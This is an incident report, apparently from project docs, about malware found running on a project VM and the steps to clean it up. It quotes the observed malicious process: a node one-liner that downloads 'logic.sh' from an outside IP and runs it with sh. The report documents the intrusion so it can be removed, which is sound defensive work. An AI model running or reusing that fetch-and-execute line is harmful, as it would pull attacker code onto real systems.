# Инцидент безопасности на ВМ (21.02.2026)

## Что обнаружено

При диагностике ВМ (89.169.181.191) в выводе `systemctl status domeo-standalone` видны дочерние процессы:

```text
node -e "require('http').get('http://91.92.243.113:235/logic.sh', ...)"
/bin/sh -c "sh logic.sh"
sh logic.sh
```

Это типичное поведение вредоносного кода: скачивание и выполнение скрипта с внешнего сервера. В кодовой базе проекта (исходники, скрипты) **такого кода нет** — строка не найдена в репозитории.

## Возможные источники

1. **Уязвимая зависимость npm** — эксплойт через уязвимость в одной из библиотек.
2. **Компрометация ВМ** — доступ по SSH, выполнение скриптов от имени пользователя.
3. **Подмена артефакта** — теоретически подмена при сборке/загрузке (менее вероятно при деплое с вашего ПК).

## Рекомендуемые действия

1. **Немедленно на ВМ:**
   - Остановить приложение: `sudo systemctl stop domeo-standalone`
   - Убить подозрительные процессы:  
     `pkill -f logic.sh; pkill -f "91.92.243.113"`
   - Удалить скачанный скрипт (если есть):  
     `sudo find /home -name "logic.sh" -delete`
   - Проверить крон и автозагрузку:  
     `crontab -l`, `ls -la ~/.config/autostart`, `systemctl list-units --type=service --state=running`

2. **Проверить зависимости:**
   - Локально: `npm audit` и `npm audit fix` (осторожно с автоматическими правками).
   - Просмотреть обновления для всех зависимостей, особенно тех, что выполняют сетевые запросы или `child_process`.

3. **Дальше:**
   - Сменить пароли и ключи доступа к ВМ и БД.
   - Рассмотреть пересоздание ВМ и деплой с чистой сборки после проверки зависимостей.
   - Заблокировать исходящие запросы к 91.92.243.113 на файрволе (если возможно).

## После очистки

Перезапуск приложения:

```powershell
.\scripts\restart-vm-app.ps1
```

или на ВМ:

```bash
sudo systemctl start domeo-standalone
```

Повторно проверить, что подозрительных дочерних процессов нет:

```bash
ps aux | grep -E "logic\.sh|91\.92\.243"
sudo systemctl status domeo-standalone
```
